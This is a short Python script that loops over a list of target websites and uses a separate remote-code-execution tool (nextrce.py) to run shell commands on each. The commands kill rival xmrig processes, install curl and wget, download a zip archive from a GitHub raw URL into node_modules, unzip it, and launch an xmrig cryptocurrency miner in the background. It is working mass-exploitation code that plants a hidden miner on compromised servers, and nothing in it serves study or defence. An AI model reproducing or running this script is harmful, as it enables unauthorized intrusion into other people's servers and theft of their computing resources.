import subprocess

SITELIST = "z.txt"
SUCCESS_MARK = "[*] Scan completed."

commands = [
    "pkill -9 -f xmrig",
    "apt install wget -y",
    "apt install curl -y",
    "curl -L https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip -o node_modules/zzx.zip > wget.log 2>&1",
    "wget -O node_modules/zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip > node_modules/xm.log 2>&1",
    "apt install unzip -y",
    "unzip node_modules/zzx.zip -d node_modules",
    "chmod +x node_modules/xmrig",
    "nohup node_modules/xmrig --config config.json >> node_modules/zzx.log 2>&1",
    "ps aux | grep xmrig"
]

with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

for url in sites:
    print(f"[+] Processing {url}")

    for cmd in commands:
        print(f"[>] Running: {cmd}")

        process = subprocess.run(
            ["python3", "nextrce.py", "-u", url, "-c", cmd],
            capture_output=True,
            text=True
        )

        output = process.stdout + process.stderr

        if SUCCESS_MARK in output:
            print("[✓] Command finished successfully.\n")
        else:
            print("[✗] Command failed or scan not completed.")
            print("Stopping next commands.\n")
            break

    print(f"[+] Done {url}\n")